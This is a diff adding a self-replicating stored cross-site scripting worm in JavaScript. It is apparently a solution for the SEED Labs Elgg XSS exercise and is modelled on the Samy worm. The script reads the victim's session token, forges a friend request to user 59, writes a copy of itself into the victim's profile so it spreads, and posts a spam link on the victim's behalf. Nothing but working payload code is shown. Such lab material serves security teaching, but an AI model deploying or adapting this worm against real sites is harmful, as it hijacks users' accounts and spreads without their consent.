@@ -1,0 +1,65 @@
+<script id="worm" type="text/javascript">
+	window.onload = function() {
+
+		var guid = elgg.session.user.guid;
+		var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
+		var token = '__elgg_token='+elgg.security.token.__elgg_token;
+
+		var sendurl='http://www.seed-server.com/action/friends/add?friend=59' + ts + ',' + ts + token + ',' + token;
+
+		if(guid !== 59) {
+			var Ajax = null;
+			Ajax = new XMLHttpRequest();
+		  	Ajax.open('GET', sendurl, true);
+			Ajax.setRequestHeader('Host', 'www.seed-server.com');
+			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+			Ajax.send();
+		}
+		
+		
+		var name = elgg.session.user.name;
+
+		var worm = document.getElementById("worm");
+  		var jsCode = worm ? worm.innerHTML : '';
+		var headerTag = '<script id=\"worm\" type=\"text/javascript\">';
+		var tailTag = '</'+'script>';
+		var wormCode = encodeURIComponent(headerTag+jsCode+tailTag);
+		
+        	sendurl = 'http://www.seed-server.com/action/profile/edit';
+
+		var content = '';
+        	content += token + ts;
+        
+        	content += "&description=" + wormCode + "&accesslevel[description]=1";
+        	content += "&guid=" + guid;
+
+		/* creating and sending Ajax request to modify victim's profile */
+		if(guid !== 59) {
+			var Ajax = null;
+			Ajax = new XMLHttpRequest();
+		  	Ajax.open('POST', sendurl, true);
+			Ajax.setRequestHeader('Host', 'www.seed-server.com');
+			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+			Ajax.send(content);
+		}
+
+		
+		var username = elgg.session.user.username;
+
+       	sendurl = 'http://www.seed-server.com/action/thewire/add'; 
+		var message = "To earn 12 USD/Hour(!), visit now\n";
+    		var link = encodeURIComponent("http://www.seed-server.com/profile/samy");
+   		message = message + link;
+   		var content = token +  ts + "&body=" + message;
+		
+		/* creating and sending Ajax request to post on the wire on behalf of the victim */
+		if(guid !== 59) {
+			var Ajax = null;
+			Ajax = new XMLHttpRequest();
+		  	Ajax.open('POST', sendurl, true);
+			Ajax.setRequestHeader('Host', 'www.seed-server.com');
+			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+			Ajax.send(content);
+		}
+	}
+</script>
